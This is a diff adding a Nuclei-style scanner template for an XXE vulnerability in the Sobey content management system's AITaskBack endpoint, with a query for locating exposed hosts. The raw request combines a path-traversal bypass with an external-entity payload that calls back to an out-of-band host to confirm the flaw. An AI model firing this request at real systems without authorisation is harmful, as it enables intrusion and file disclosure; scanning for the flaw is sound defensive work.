@@ -1,0 +1,32 @@
+id: sobey-cms-aitaskback-xxe
+info:
+  name: "索贝内容管理系统 AITaskBack 接口 XML外部实体注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fpga: icon_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"
+        索贝内容管理系统在 /sobey-mchEditor/mch/AIInt/AITaskBack 接口的XML数据解析过程中存在实体处理缺陷。攻击者可利用特制的XML实体结构触发信息泄露，导致服务器端文件内容被非授权访问。该漏洞允许通过构造包含外部实体引用的请求包，实现敏感数据读取或横向渗透攻击。
+  tags: 索贝内容管理系统
+http:
+- raw:
+  - |
+    POST /sobey-mchEditor/js/%2e%2e/mch/AIInt/AITaskBack?contentid=1&token=&siteCode= HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/xml
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE root [
+      <!ENTITY xxe SYSTEM "http://{{interactsh-url}}">
+    ]>
+    <root>
+      <TextResult>&xxe;</TextResult>
+    </root>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 500
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
